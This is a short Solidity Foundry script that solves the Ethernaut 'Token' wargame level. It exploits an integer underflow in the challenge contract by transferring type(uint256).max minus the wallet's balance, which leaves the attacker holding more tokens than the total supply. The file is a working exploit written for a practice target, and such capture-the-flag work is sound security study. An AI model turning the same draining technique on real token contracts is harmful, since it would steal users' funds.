// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Script } from "forge-std/Script.sol";
import { Token } from "ethernaut/L4.token.sol";

contract TokenCrackerScript is Script {
  function run() external {
    Token token = Token(vm.envAddress("ETHERNAUT_TOKEN_ADDRESS"));
    address wallet = vm.envAddress("WALLET_ADDRESS");

    uint256 balance = token.balanceOf(wallet);

    vm.broadcast(vm.envAddress("ETH_FROM"));
    token.transfer(wallet, type(uint256).max - balance);

    assert(token.balanceOf(wallet) > token.totalSupply());
  }
}
